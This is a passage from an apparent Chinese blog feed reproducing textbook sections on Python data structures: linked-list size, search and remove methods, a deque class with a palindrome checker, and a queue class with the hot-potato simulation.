行中的赋值语句将当前元素移动到下一个节点。再次，将引用与 None 进行比较的能力是非常有用的。每当 <code>current</code> 移动到一个新的节点，我们加 1 以计数。最后，<code>count</code> 在迭代停止后返回。Figure 9 展示了处理这个链表的过程。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">size</span><span class="params">(self)</span>:</span></div><div class="line">    current=self.head</div><div class="line">    count=<span class="number">0</span></div><div class="line">    <span class="keyword">while</span> current!=<span class="keyword">None</span>:</div><div class="line">        count=count+<span class="number">1</span></div><div class="line">        current=current.getNext()</div><div class="line">    <span class="keyword">return</span> count</div></pre></td></tr></table></figure><p><em>Listing 5</em></p><p><img src="https://facert.gitbooks.io/python-data-structure-cn/3.%E5%9F%BA%E6%9C%AC%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/3.21.%E5%AE%9E%E7%8E%B0%E6%97%A0%E5%BA%8F%E5%88%97%E8%A1%A8%EF%BC%9A%E9%93%BE%E8%A1%A8/assets/3.21.%E5%AE%9E%E7%8E%B0%E6%97%A0%E5%BA%8F%E5%88%97%E8%A1%A8%EF%BC%9A%E9%93%BE%E8%A1%A8.figure9.png" alt="image"></p><p><em>Figure 9</em></p><p>在链表中搜索也使用遍历技术。当我们访问链表中的每个节点时，我们将询问储存在其中的数据是否与我们正在寻找的项匹配。然而，在这种情况下，我们不必一直遍历到列表的末尾。事实上，如果我们到达链表的末尾，这意味着我们正在寻找的项不存在。此外，如果我们找到项，没有必要继续。</p><p>Listing 6展示了搜索方法的实现。和在size方法中一样，遍历从列表的头部开始初始化（行2）。我们还使用一个布尔变量叫found，标记我们是否找到了正在寻找的项。因为我们还没有在遍历开始时找到该项，found设置为False（第3行）。第4行中迭代考虑了上述两个条件。只要有更多的节点访问，而且我们没有找到正在寻找的项，我们就继续检查下一个节点。第5行检查数据项是否存在于当前节点中。如果存在，found设置为True。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">search</span><span class="params">(self,item)</span>:</span></div><div class="line">    current=self.head</div><div class="line">    found=<span class="keyword">False</span></div><div class="line">    </div><div class="line">    <span class="keyword">while</span> current!=<span class="keyword">None</span> <span class="keyword">and</span> <span class="keyword">not</span> found:</div><div class="line">        <span class="keyword">if</span> current.get.Data()==item:</div><div class="line">            found=<span class="keyword">True</span></div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            current=current.getNext()</div><div class="line">    <span class="keyword">return</span> found</div></pre></td></tr></table></figure><p><em>Listing 6</em></p><p>作为一个例子，试试调用search方法来查找item17</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>mylist.search(<span class="number">17</span>)</div><div class="line"><span class="keyword">True</span></div></pre></td></tr></table></figure><p>因为17在列表中，所以遍历过程中需要移动到包含17的节点。此时，<code>found</code> 变量设置为 True，while 条件将失败，返回值。 这个过程可以在 Figure 10中看到。</p><p><img src="https://facert.gitbooks.io/python-data-structure-cn/3.%E5%9F%BA%E6%9C%AC%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/3.21.%E5%AE%9E%E7%8E%B0%E6%97%A0%E5%BA%8F%E5%88%97%E8%A1%A8%EF%BC%9A%E9%93%BE%E8%A1%A8/assets/3.21.%E5%AE%9E%E7%8E%B0%E6%97%A0%E5%BA%8F%E5%88%97%E8%A1%A8%EF%BC%9A%E9%93%BE%E8%A1%A8.figure10.png" alt="image"></p><p><em>Figure 10</em></p><p><code>remove</code> 方法需要两个逻辑步骤。首先，我们需要遍历列表寻找我们要删除的项。一旦我们找到该项（我们假设它存在），删除它。第一步非常类似于搜索。从设置到链表头部的外部引用开始，我们遍历链接，直到我们发现正在寻找的项。因为我们假设项存在，我们知道迭代将在 <code>current</code> 变为 <code>None</code> 之前停止。这意味着我们可以简单地使用 <code>found</code> 布尔值。</p><p>当 <code>found</code> 变为 True 时，<code>current</code> 将是对包含要删除的项的节点的引用。但是我们如何删除呢？一种方法是用标示该项目不再存在的某个标记来替换项目的值。这种方法的问题是节点数量将不再匹配项数量。最好通过删除整个节点来删除该项。</p><p>为了删除包含项的节点，我们需要修改上一个节点中的链接，以便它指向当前之后的节点。不幸的是，链表遍历没法回退。因为 <code>current</code> 指我们想要进行改变的节点之前的节点，所以进行修改太迟了。</p><p>这个困境的解决方案是在我们遍历链表时使用两个外部引用。<code>current</code> 将像之前一样工作，标记遍历的当前位置。新的引用，我们叫 <code>previous</code>，将总是传递 <code>current</code>后面的一个节点 。这样，当 <code>current</code> 停止在要被去除的节点时，<code>previous</code> 将引用链表中用于修改的位置。</p><p>Listing 7 展示了完整的 <code>remove</code> 方法。第 2-3 行给这两个引用赋初始值。注意，<code>current</code> 在链表头处开始，和在其他遍历示例中一样。然而，<code>previous</code> 假定总是在 <code>current</code>之后一个节点。因此，由于在 <code>previous</code> 之前没有节点，所以之前的值将为 None（见 Figure 11）。<code>found</code> 的布尔变量将再次用于控制迭代。</p><p>在第 6-7 行中，我们检查存储在当前节点中的项是否是我们希望删除的项。如果是，<code>found</code> 设置为 True 。如果我们没有找到该项，则 <code>previous</code> 和 <code>current</code> 都必须向前移动一个节点。同样，这两个语句的顺序是至关重要的。<code>previous</code> 必须先将一个节点移动到 <code>current</code> 的位置。此时，才可以移动<code>current</code>。这个过程通常被称为“英寸蠕动”，因为 <code>previous</code> 必须赶上 <code>current</code>，然后 <code>current</code> 前进。Figure 12 展示了 <code>previous</code> 和<code>current</code> 的移动，它们沿着链表向下移动，寻找包含值 17 的节点。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">remove</span><span class="params">(self,item)</span>:</span></div><div class="line">    current=self.head</div><div class="line">    previous=<span class="keyword">None</span></div><div class="line">    found=<span class="keyword">False</span></div><div class="line">    <span class="keyword">while</span> <span class="keyword">not</span> found:</div><div class="line">        <span class="keyword">if</span> current.getData()==item:</div><div class="line">            found=<span class="keyword">True</span></div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            previous=current</div><div class="line">            current=current.getNext()</div><div class="line"></div><div class="line">    <span class="keyword">if</span> previous==<span class="keyword">None</span>:</div><div class="line">        self.head=current.getNext()</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        previous.setNext(current.getNext())</div></pre></td></tr></table></figure><p><em>Figure 11</em></p><p><img src="https://facert.gitbooks.io/python-data-structure-cn/3.%E5%9F%BA%E6%9C%AC%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/3.21.%E5%AE%9E%E7%8E%B0%E6%97%A0%E5%BA%8F%E5%88%97%E8%A1%A8%EF%BC%9A%E9%93%BE%E8%A1%A8/assets/3.21.%E5%AE%9E%E7%8E%B0%E6%97%A0%E5%BA%8F%E5%88%97%E8%A1%A8%EF%BC%9A%E9%93%BE%E8%A1%A8.figure12.png" alt="image"></p><p><em>Figure 12</em></p><p>一旦 <code>remove</code> 的搜索步骤已经完成，我们需要从链表中删除该节点。 Figure 13 展示了要修改的链接。但是，有一个特殊情况需要解决。 如果要删除的项目恰好是链表中的第一个项，则 <code>current</code> 将引用链接列表中的第一个节点。这也意味着 <code>previous</code> 是 None。 我们先前说过，<code>previous</code> 是一个节点，它的下一个节点需要修改。在这种情况下，不是 <code>previous</code> ，而是链表的 <code>head</code> 需要改变（见 Figure 14）。</p><p><img src="https://facert.gitbooks.io/python-data-structure-cn/3.%E5%9F%BA%E6%9C%AC%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/3.21.%E5%AE%9E%E7%8E%B0%E6%97%A0%E5%BA%8F%E5%88%97%E8%A1%A8%EF%BC%9A%E9%93%BE%E8%A1%A8/assets/3.21.%E5%AE%9E%E7%8E%B0%E6%97%A0%E5%BA%8F%E5%88%97%E8%A1%A8%EF%BC%9A%E9%93%BE%E8%A1%A8.figure13.png" alt="image"></p><p><em>Figure 13</em></p><p><img src="https://facert.gitbooks.io/python-data-structure-cn/3.%E5%9F%BA%E6%9C%AC%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/3.21.%E5%AE%9E%E7%8E%B0%E6%97%A0%E5%BA%8F%E5%88%97%E8%A1%A8%EF%BC%9A%E9%93%BE%E8%A1%A8/assets/3.21.%E5%AE%9E%E7%8E%B0%E6%97%A0%E5%BA%8F%E5%88%97%E8%A1%A8%EF%BC%9A%E9%93%BE%E8%A1%A8.figure14.png" alt="image"></p><p><em>Figure 14</em></p><p>第 12 行检查是否处理上述的特殊情况。如果 <code>previous</code> 没有移动，当 <code>found</code> 的布尔变为 True 时，它仍是 None。 在这种情况下（行13），链表的 <code>head</code> 被修改以指代当前节点之后的节点，实际上是从链表中移除第一节点。 但是，如果 <code>previous</code> 不为 None，则要删除的节点位于链表结构的下方。 在这种情况下，<code>previous</code> 的引用为我们提供了下一个引用更改的节点。第 15 行使用之前的 <code>setNext</code> 方法完成删除。注意，在这两种情况下，引用更改的目标是 <code>current.getNext()</code>。 经常出现的一个问题是，这里给出的两种情况是否也将处理要移除的项在链表的最后节点中的情况。我们留给你思考。</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;列表&quot;&gt;&lt;a href=&quot;#列表&quot; class=&quot;headerlink&quot; title=&quot;列表&quot;&gt;&lt;/a&gt;列表&lt;/h1&gt;&lt;p&gt;在对基本数据结构的讨论中，我们使用Python列表来实现所呈现的抽象数据类型。列表是一个强大但简单的收集机制，为程序员提供了各种各样的操作。然而，不是所有的编程语言都包括列表集合、在这些情况下，列表的概念必须由程序员实现。
    
    </summary>
    
      <category term="Python" scheme="http://adamzeng.site/categories/Python/"/>
    
    
      <category term="Python" scheme="http://adamzeng.site/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>什么是Deque</title>
    <link href="http://adamzeng.site/2017/10/29/%E4%BB%80%E4%B9%88%E6%98%AFDeque/"/>
    <id>http://adamzeng.site/2017/10/29/什么是Deque/</id>
    <published>2017-10-29T14:14:57.000Z</published>
    <updated>2017-10-29T14:53:19.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="什么是Deque"><a href="#什么是Deque" class="headerlink" title="什么是Deque"></a>什么是Deque</h1><p>deque（也称为双端队列）是与队列类似的项的有序集合。它有两个端部，首部和尾部，并且项在集合中保持不变。deque不同的地方是添加和删除项是非限制性的。可以在前面或后面添加新项。同样，可以从任一端移除现有项。在某种意义上，这种混合线性结构提供了单个数据结构中的栈和队列的所有能力。Figure 1展示了一个Python数据对象的deque。<a id="more"></a></p><p>要注意，即使deque可以拥有栈和队列的许多特性，它不需要由哪些数据结构强制的LIFO和FIFO排序。这取决于你如何持续添加和删除操作。</p><p><img src="https://facert.gitbooks.io/python-data-structure-cn/3.%E5%9F%BA%E6%9C%AC%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/3.15.%E4%BB%80%E4%B9%88%E6%98%AFDeque/assets/3.15.%E4%BB%80%E4%B9%88%E6%98%AFDeque.figure1-1.png" alt="image"></p><p><em>Figure 1</em></p><h3 id="Deque抽象数据类型"><a href="#Deque抽象数据类型" class="headerlink" title="Deque抽象数据类型"></a>Deque抽象数据类型</h3><p>deque抽象数据类型由以下结构和操作定义。如上所述，deque被构造为项的有序集合，其中项从首部或尾部的任一端添加和移除。下面给出了deque操作。</p><ul><li>Deque()创建一个空的新deque，它不需要参数，并返回空的deque。</li><li>addFront(item)将一个新项添加到deque首部。它需要item参数，并不返回任何内容。</li><li>addRear(item)将一个新项添加到deque尾部。它需要item参数，并不返回任何内容。</li><li>removeFront() 从 deque 中删除首项。它不需要参数并返回 item。deque 被修改。</li><li>removeRear() 从 deque 中删除尾项。它不需要参数并返回 item。deque 被修改。</li><li>isEmpty() 测试 deque 是否为空。它不需要参数，并返回布尔值。</li><li>size() 返回 deque 中的项数。它不需要参数，并返回一个整数。</li></ul><p>例如，我们假设 d 是已经创建并且当前为空的 deque，则 Table 1 展示了一系列 deque 操作的结果。注意，首部的内容列在右边。在将 item 移入和移出时，跟踪前面和后面是非常重要的，因为可能会有点混乱。</p><p><img src="https://facert.gitbooks.io/python-data-structure-cn/3.%E5%9F%BA%E6%9C%AC%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/3.16.Deque%E6%8A%BD%E8%B1%A1%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/assets/3.16.Deque%E6%8A%BD%E8%B1%A1%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B.table1.png" alt="image"></p><p><em>Table 1</em></p><h3 id="Python实现Deque"><a href="#Python实现Deque" class="headerlink" title="Python实现Deque"></a>Python实现Deque</h3><p>正如我们在前面的部分中所做的，我们将为抽象数据类型deque的实现创建一个新类。同样，Python列表将提供一组非常好的方法来构建deque的细节。我们的实现（Listing 1）将假定deque的尾部在列表中的位置为0。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Deque</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></div><div class="line">        self.items= []</div><div class="line">        </div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">isEmpty</span><span class="params">(self)</span>:</span></div><div class="line">        <span class="keyword">return</span> self.items==[]</div><div class="line">     </div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">addFront</span><span class="params">(self,item)</span>:</span></div><div class="line">        self.items.append(item)</div><div class="line">        </div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">addRear</span><span class="params">(self,item)</span>:</span></div><div class="line">        self.items.insert(<span class="number">0</span>,item)</div><div class="line">        </div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">removeFront</span><span class="params">(self)</span>:</span></div><div class="line">        <span class="keyword">return</span> self.items.pop()</div><div class="line">    </div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">removeRear</span><span class="params">(self)</span>:</span></div><div class="line">        <span class="keyword">return</span> self.items.pop(<span class="number">0</span>)</div><div class="line">    </div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">size</span><span class="params">(self)</span>:</span></div><div class="line">        <span class="keyword">return</span> len(self.items)</div></pre></td></tr></table></figure><p><em>Listing 1</em></p><p>在removeFront中，我们使用pop方法从列表中删除最后一个元素。但是，在removeRear中，pop(0)方法必须删除列表的第一个元素。同样，我们需要在addRear中使用insert方法（第12行），因为append方法在列表末尾添加一个新元素。</p><p>你可以看到许多与栈和队列中描述的 Python 代码相似之处。你也可能观察到，在这个实现中，从前面添加和删除项是 O(1)，而从后面添加和删除是 O(n)。 考虑到添加和删除项是出现的常见操作，这是可预期的。 同样，重要的是要确定我们知道在实现中前后都分配在哪里。</p><h3 id="回文检查"><a href="#回文检查" class="headerlink" title="回文检查"></a>回文检查</h3><p>使用 deque 数据结构可以容易地解决经典回文问题。回文是一个字符串，读取首尾相同的字符，例如，<code>radar toot madam</code>。 我们想构造一个算法输入一个字符串，并检查它是否是一个回文。</p><p>该问题的解决方案将使用 deque 来存储字符串的字符。我们从左到右处理字符串，并将每个字符添加到 deque 的尾部。在这一点上，deque 像一个普通的队列。然而，我们现在可以利用 deque 的双重功能。 deque 的首部保存字符串的第一个字符，deque 的尾部保存最后一个字符（见 Figure 2）。</p><p><img src="https://facert.gitbooks.io/python-data-structure-cn/3.%E5%9F%BA%E6%9C%AC%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/3.18.%E5%9B%9E%E6%96%87%E6%A3%80%E6%9F%A5/assets/3.18.%E5%9B%9E%E6%96%87%E6%A3%80%E6%9F%A5.figure2.png" alt="image"></p><p><em>Figure 2</em></p><p>我们可以直接删除并比较首尾字符，只有当它们匹配时才继续。如果可以持续匹配首尾字符，我们最终要么用完字符，要么留出大小为1的deque，取决于原始字符串的长度是偶数还是奇数。在任一情况下，字符串都是回文。回文检查的完整功能在ActiveCode1中。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pythonds.basic.deque <span class="keyword">import</span> Deque</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">palchecker</span><span class="params">(aString)</span>:</span></div><div class="line">    chardeque=Deque()</div><div class="line"></div><div class="line">    <span class="keyword">for</span> ch <span class="keyword">in</span> aString:</div><div class="line">        chardeque.addRear(ch)</div><div class="line"></div><div class="line">    stillEqual=<span class="keyword">True</span></div><div class="line">    </div><div class="line">    <span class="keyword">while</span> chardeque.size()&gt;<span class="number">1</span> <span class="keyword">and</span> stillEqual:</div><div class="line">        first=chardeque.removeFront()</div><div class="line">        last=chardeque.removeRear()</div><div class="line">        <span class="keyword">if</span> first!=last:</div><div class="line">            stillEqual=<span class="keyword">False</span></div><div class="line">        </div><div class="line">            </div><div class="line">    <span class="keyword">return</span> stillEqual</div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;什么是Deque&quot;&gt;&lt;a href=&quot;#什么是Deque&quot; class=&quot;headerlink&quot; title=&quot;什么是Deque&quot;&gt;&lt;/a&gt;什么是Deque&lt;/h1&gt;&lt;p&gt;deque（也称为双端队列）是与队列类似的项的有序集合。它有两个端部，首部和尾部，并且项在集合中保持不变。deque不同的地方是添加和删除项是非限制性的。可以在前面或后面添加新项。同样，可以从任一端移除现有项。在某种意义上，这种混合线性结构提供了单个数据结构中的栈和队列的所有能力。Figure 1展示了一个Python数据对象的deque。
    
    </summary>
    
      <category term="Python" scheme="http://adamzeng.site/categories/Python/"/>
    
    
      <category term="Python" scheme="http://adamzeng.site/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>什么是队列</title>
    <link href="http://adamzeng.site/2017/10/29/%E4%BB%80%E4%B9%88%E6%98%AF%E9%98%9F%E5%88%97/"/>
    <id>http://adamzeng.site/2017/10/29/什么是队列/</id>
    <published>2017-10-29T10:41:28.000Z</published>
    <updated>2017-10-29T14:10:30.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="什么是队列"><a href="#什么是队列" class="headerlink" title="什么是队列"></a>什么是队列</h1><p>队列是项的有序结合，其中添加新项的一端称为队尾，移除项的一端称为队首。当一个元素从队尾进入队列时，一直向队首移动，直到它成为下一个需要移除的元素为止。<a id="more"></a></p><p>最近添加的元素必须在队尾等待。集合中存活时间最长的元素在队首，这种排序成为 FIFO，先进先出，也被成为先到先得。</p><p>+</p><p>队列的最简单的例子是我们平时不时会参与的列。排队等待电影，在杂货店的收营台等待，在自助餐厅排队等待（这样我们可以弹出托盘栈）。行为良好的线或队列是有限制的，因为它只有一条路，只有一条出路。不能插队，也不能离开。你只有等待了一定的时间才能到前面。Figure 1 展示了一个简单的 Python 对象队列。</p><p><img src="https://facert.gitbooks.io/python-data-structure-cn/3.%E5%9F%BA%E6%9C%AC%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/3.10.%E4%BB%80%E4%B9%88%E6%98%AF%E9%98%9F%E5%88%97/assets/3.10.%E4%BB%80%E4%B9%88%E6%98%AF%E9%98%9F%E5%88%97.figure1.png" alt="image"></p><p><em>Figure 1</em></p><p>计算机科学也有常见的队列示例。我们的计算机实验室有 30 台计算机与一台打印机联网。当学生想要打印时，他们的打印任务与正在等待的所有其他打印任务“一致”。第一个进入的任务是先完成。如果你是最后一个，你必须等待你前面的所有其他任务打印。我们将在后面更详细地探讨这个有趣的例子。</p><p>除了打印队列，操作系统使用多个不同的队列来控制计算机内的进程。下一步做什么的调度通常基于尽可能快地执行程序和尽可能多的服务用户的排队算法。此外，当我们敲击键盘时，有时屏幕上出现的字符会延迟。这是由于计算机在那一刻做其他工作。按键的内容被放置在类似队列的缓冲器中，使得它们最终可以以正确的顺序显示在屏幕上。</p><h3 id="1-队列抽象数据类型"><a href="#1-队列抽象数据类型" class="headerlink" title="1.队列抽象数据类型"></a>1.队列抽象数据类型</h3><p>队列抽象数据类型由以下结构和操作定义。如上所述，队列被构造为在队尾添加项的有序集合，并且从队首移除。队列保持FIFO属性。队列操作如下。</p><ul><li>Queue()创建一个空的新队列。它不需要参数，并返回一个空队列。</li><li>enqueue（item）将新项添加到队尾。它需要item作为参数，并不返回任何内容。</li><li>dequeue()从队首移除项。它不需要参数并返回item。队列被修改。</li><li>isEmpty()查看队列是否为空。它不需要参数，并返回布尔值。</li><li>size（）返回队列中的项数。它不需要参数，并返回一个整数。</li></ul><p>作为示例，我们假设q是已经创建并且当前为空的队列，则Table 1展示了队列操作序列的结果。右边表示队首。4是第一个入队的项，因此它dequeue返回的第一个项。</p><p><img src="https://facert.gitbooks.io/python-data-structure-cn/3.%E5%9F%BA%E6%9C%AC%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/3.11.%E9%98%9F%E5%88%97%E6%8A%BD%E8%B1%A1%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/assets/3.11.%E9%98%9F%E5%88%97%E6%8A%BD%E8%B1%A1%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B.table1.png" alt="image"></p><h3 id="2-Python实现队列"><a href="#2-Python实现队列" class="headerlink" title="2.Python实现队列"></a>2.Python实现队列</h3><p>我们为了实现队列抽象数据类型创建一个新类。和前面一样，我们将使用列表集合来作为构建队列的内部表示。</p><p>我们需要确定列表的哪一端作为队首，哪一端作为队尾。Listing 1 所示的实现假定队尾在列表中的位置为 0。这允许我们使用列表上的插入函数向队尾添加新元素。弹出操作可用于删除队首的元素（列表的最后一个元素）。回想一下，这也意味着入队为 O(n)，出队为 O(1)。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Queue</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></div><div class="line">        self.items = []</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">isEmpty</span><span class="params">(self)</span>:</span></div><div class="line">        <span class="keyword">return</span> self.items == []</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">enqueue</span><span class="params">(self, item)</span>:</span></div><div class="line">        self.items.insert(<span class="number">0</span>,item)</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">dequeue</span><span class="params">(self)</span>:</span></div><div class="line">        <span class="keyword">return</span> self.items.pop()</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">size</span><span class="params">(self)</span>:</span></div><div class="line">        <span class="keyword">return</span> len(self.items)</div><div class="line"></div><div class="line">Listing <span class="number">1</span></div><div class="line">进一步的操作这个队列产生如下结果：</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>q.size()</div><div class="line"><span class="number">3</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>q.isEmpty()</div><div class="line"><span class="keyword">False</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>q.enqueue(<span class="number">8.4</span>)</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>q.dequeue()</div><div class="line"><span class="number">4</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>q.dequeue()</div><div class="line"><span class="string">'dog'</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>q.size()</div><div class="line"><span class="number">2</span></div></pre></td></tr></table></figure><h3 id="3-模拟：烫手山芋"><a href="#3-模拟：烫手山芋" class="headerlink" title="3.模拟：烫手山芋"></a>3.模拟：烫手山芋</h3><p>队列的应用之一是模拟需要以FIFO方式管理数据的真是场景。首先，让我们看看孩子们的游戏烫手山芋，在这个游戏中（见Figure 2),孩子们围成一个圈，并尽可能快的将一个山芋递给旁边的孩子。在某一个时间，动作结束，有山芋的孩子从圈中移除。游戏继续开始知道剩下最后一个孩子。</p><p><img src="https://facert.gitbooks.io/python-data-structure-cn/3.%E5%9F%BA%E6%9C%AC%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/3.13.%E6%A8%A1%E6%8B%9F%EF%BC%9A%E7%83%AB%E6%89%8B%E5%B1%B1%E8%8A%8B/assets/3.13.%E6%A8%A1%E6%8B%9F%EF%BC%9A%E7%83%AB%E6%89%8B%E5%B1%B1%E8%8A%8B.figure2.png" alt="image"></p><p><em>Figure 2</em></p><p>这个游戏相当于著名的约瑟夫问题，一个一世纪著名历史学家弗拉维奥·约瑟夫斯的传奇故事。故事讲的是，他和他的39个战友被罗马军队包围在洞中。他们决定宁愿死，也不成为罗马人的奴隶。他们围成一个圈，其中一人被指定为第一个人，顺时针报数到第七人，就将他杀死。约瑟夫斯是一个成功的数学家，他立即想出了应该坐到哪才能成为最后一人。最后，他加入了罗马的一方，而不是杀了自己。你可以找到这个故事的不同版本，有些说是每次报数 3 个人，有人说允许最后一个人逃跑。无论如何，思想是一样的。</p><p>我们将模拟这个烫手芋的过程，我们的程序将输入名称列表和一个称为num常量用于报数。它将返回以num为单位重复报数后剩余的最后一个人的姓名。</p><p>为了模拟这个圈，我们使用队列（见Figure 3）。假设拿着山芋的孩子在队列的前面。当拿到山芋的时候，这个孩子将先出列再入队列，把他放在队列的最后。经过num次的出队入队后，前面的孩子将被永久移除队列。并且另一个周期开始，继续此过程，直到另一个周期的开始，继续此过程，直到只剩下一个名字（队列的大小为1）。</p><p><img src="https://facert.gitbooks.io/python-data-structure-cn/3.%E5%9F%BA%E6%9C%AC%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/3.13.%E6%A8%A1%E6%8B%9F%EF%BC%9A%E7%83%AB%E6%89%8B%E5%B1%B1%E8%8A%8B/assets/3.13.%E6%A8%A1%E6%8B%9F%EF%BC%9A%E7%83%AB%E6%89%8B%E5%B1%B1%E8%8A%8B.figure3.png" alt="image"></p><p><em>Figure 3</em></p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pythonds.basic.queue <span class="keyword">import</span> Queue</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">hotPotato</span><span class="params">(namelist, num)</span>:</span></div><div class="line">    simqueue = Queue()</div><div class="line">    <span class="keyword">for</span> name <span class="keyword">in</span> namelist:</div><div class="line">        simqueue.enqueue(name)</div><div class="line"></div><div class="line">    <span class="keyword">while</span> simqueue.size() &gt; <span class="number">1</span>:</div><div class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(num):</div><div class="line">            simqueue.enqueue(simqueue.dequeue())</div><div class="line"></div><div class="line">        simqueue.dequeue()</div><div class="line"></div><div class="line">    <span class="keyword">return</span> simqueue.dequeue()</div><div class="line"></div><div class="line">print(hotPotato([<span class="string">"Bill"</span>,<span class="string">"David"</span>,<span class="string">"Susan"</span>,<span class="string">"Jane"</span>,<span class="string">"Kent"</span>,<span class="string">"Brad"</span>],<span class="number">7</span>))</div></pre></td></tr></table></figure><p><em>Active code 1</em></p><p>请注意，在此示例中，计数常数的值大于列表中的名称数。这不是一个问题，因为队列像一个圈，计数会重新回到开始，直到达到计数值。另外，请注意，列表加载到队列中以使列表上的名字位于队列的前面。在这种情况下，<code>Bill</code> 是列表中的第一个项，因此他在队列的前面。</p><h3 id="4-模拟：打印机"><a href="#4-模拟：打印机" class="headerlink" 